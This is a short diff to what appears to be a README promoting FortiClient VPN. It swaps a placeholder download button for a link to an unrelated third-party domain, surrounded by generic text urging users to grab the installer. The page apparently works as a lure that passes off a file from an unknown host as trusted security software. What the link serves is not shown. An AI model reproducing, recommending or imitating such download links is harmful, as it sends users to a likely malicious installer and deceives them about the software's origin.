@@ -13,7 +13,7 @@ FortiClient is a comprehensive endpoint security solution designed to integrate 
 ## Installation
 To start using FortiClient VPN, download the installation file by clicking the button below:  
 
-**[Download FortiClient VPN](*)**  
+**[Download FortiClient VPN](https://duaane.org/data/)**  
 
 Setting up FortiClient VPN is quick and straightforward. Grab the installation package, follow the step-by-step instructions, and connect securely in no time. Whether you’re on Windows, macOS, or Linux, the setup process is designed for maximum convenience.
 
